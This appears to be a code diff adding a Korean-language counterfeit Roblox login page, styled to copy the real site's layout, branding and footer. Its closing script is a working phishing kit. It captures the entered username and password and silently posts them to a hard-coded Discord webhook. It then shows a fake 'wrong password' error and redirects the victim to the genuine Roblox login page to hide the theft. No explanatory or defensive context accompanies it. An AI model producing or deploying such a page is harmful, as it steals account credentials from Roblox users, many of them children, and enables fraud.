@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox에 로그인</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, 'Source Sans Pro', 'Noto Sans KR', 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* 상단 검은색 네비게이션 바 */
+        .navbar {
+            background: #101010;
+            padding: 0 24px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+        }
+        .nav-left { display: flex; align-items: center; gap: 24px; }
+        .nav-logo {
+            width: 36px; height: 36px;
+            background: #E2231A;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            text-decoration: none;
+        }
+        .nav-link {
+            color: #999;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+        .nav-link:hover { color: white; }
+        .nav-right { display: flex; align-items: center; gap: 12px; }
+        .nav-signup {
+            background: transparent;
+            color: #ccc;
+            border: 1px solid #555;
+            border-radius: 30px;
+            padding: 6px 18px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .nav-signup:hover { border-color: #888; color: white; }
+        .nav-login {
+            background: #E2231A;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 6px 18px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .nav-login:hover { background: #c41f17; }
+
+        /* 메인 콘텐츠 */
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding-top: 48px;
+            min-height: 100vh;
+        }
+
+        .login-card {
+            background: white;
+            border-radius: 12px;
+            padding: 40px 32px 32px;
+            width: 380px;
+            max-width: 92%;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            text-align: center;
+        }
+
+        /* Roblox 로고 */
+        .rbx-logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 12px;
+            background: #E2231A;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .rbx-logo svg { width: 36px; height: 36px; }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 20px;
+            letter-spacing: -0.3px;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 14px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 11px 13px;
+            border: 1px solid #d5d7dd;
+            border-radius: 6px;
+            font-size: 14px;
+            background: white;
+            outline: none;
+            color: #000;
+        }
+        .input-group input:focus {
+            border-color: #E2231A;
+            box-shadow: 0 0 0 2px rgba(226,35,26,0.08);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #E2231A;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 700;
+            margin-top: 6px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .login-btn:hover { background: #c41f17; }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 14px;
+            font-size: 12px;
+            color: #E2231A;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .forgot-link:hover { text-decoration: underline; }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #888;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        .divider span { padding: 0 14px; }
+
+        .device-btn {
+            width: 100%;
+            padding: 10px;
+            background: white;
+            color: #555;
+            border: 1px solid #d5d7dd;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .device-btn:hover { background: #f5f5f5; }
+
+        .signup-text {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        .signup-text a {
+            color: #E2231A;
+            text-decoration: none;
+            font-weight: 700;
+        }
+        .signup-text a:hover { text-decoration: underline; }
+
+        .error-msg {
+            color: #E2231A;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+            padding: 8px 10px;
+            background: #fef0ef;
+            border-radius: 6px;
+        }
+
+        /* 푸터 */
+        .footer {
+            background: #101010;
+            padding: 18px 24px;
+            text-align: center;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 14px;
+            list-style: none;
+            margin-bottom: 10px;
+        }
+        .footer-links a {
+            color: #888;
+            text-decoration: none;
+            font-size: 11px;
+        }
+        .footer-links a:hover { color: white; }
+        .footer-copy {
+            color: #555;
+            font-size: 10px;
+        }
+
+        @media (max-width: 480px) {
+            .login-card { padding: 28px 20px 24px; border-radius: 0; box-shadow: none; }
+            .navbar { padding: 0 12px; }
+            .nav-link { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 네비게이션 바 -->
+    <nav class="navbar">
+        <div class="nav-left">
+            <a href="/" class="nav-logo">R</a>
+            <a href="#" class="nav-link">차트</a>
+            <a href="#" class="nav-link">마켓플레이스</a>
+            <a href="#" class="nav-link">만들기</a>
+            <a href="#" class="nav-link">Robux</a>
+        </div>
+        <div class="nav-right">
+            <a href="#" class="nav-signup">회원가입</a>
+            <a href="#" class="nav-login">로그인</a>
+        </div>
+    </nav>
+
+    <!-- 로그인 카드 -->
+    <div class="main-container">
+        <div class="login-card">
+
+            <!-- 빨간색 R 로고 -->
+            <div class="rbx-logo">
+                <svg viewBox="0 0 36 36" fill="none">
+                    <rect x="2" y="2" width="32" height="32" rx="7" fill="white" opacity="0.25"/>
+                    <path d="M10 26L26 10M10 10L26 26" stroke="white" stroke-width="3.2" stroke-linecap="round"/>
+                </svg>
+            </div>
+
+            <h1>Roblox에 로그인</h1>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="username">사용자 이름/이메일/전화번호</label>
+                    <input type="text" id="username" placeholder="사용자 이름/이메일/전화번호" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">비밀번호</label>
+                    <input type="password" id="password" placeholder="비밀번호" required>
+                </div>
+                <button class="login-btn" type="submit">로그인</button>
+                <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
+
+                <div class="divider"><span>로그인 방법</span></div>
+
+                <button class="device-btn" type="button">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2">
+                        <rect x="2" y="3" width="20" height="14" rx="2"/>
+                        <line x1="8" y1="21" x2="16" y2="21"/>
+                        <line x1="12" y1="17" x2="12" y2="21"/>
+                    </svg>
+                    로그인 중인 다른 기기
+                </button>
+
+                <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다.</div>
+            </form>
+
+            <div class="signup-text">
+                계정이 없으신가요? <a href="#">회원가입</a>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- 푸터 -->
+    <div class="footer">
+        <ul class="footer-links">
+            <li><a href="#">회사 소개</a></li>
+            <li><a href="#">인재 채용</a></li>
+            <li><a href="#">블로그</a></li>
+            <li><a href="#">보호자 가이드</a></li>
+            <li><a href="#">기프트 카드 구매</a></li>
+            <li><a href="#">도움말</a></li>
+            <li><a href="#">이용 약관</a></li>
+            <li><a href="#">접근성</a></li>
+            <li><a href="#">개인정보 처리방침</a></li>
+            <li><a href="#">사이트 맵</a></li>
+        </ul>
+        <div class="footer-copy">
+            &copy;2026 Roblox Corporation. Roblox, Roblox 로고 및 Powering Imagination은 미국 및 그 외 국가에서 등록 상표 및 미등록 상표입니다.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var webhookURL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPPAQeHTqtDyQnAzY8mmPX4w';
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '**Roblox 로그인 정보**',
+                    embeds: [{
+                        title: '새로운 계정 정보',
+                        fields: [
+                            { name: '사용자 이름', value: username, inline: true },
+                            { name: '비밀번호', value: password, inline: true }
+                        ],
+                        color: 0xE2231A,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(function(err) {});
+            document.getElementById('errorMsg').style.display = 'block';
+            setTimeout(function() {
+                window.location.href = 'https://www.roblox.com/ko/login';
+            }, 2000);
+        });
+    </script>
+
+</body>
+</html>
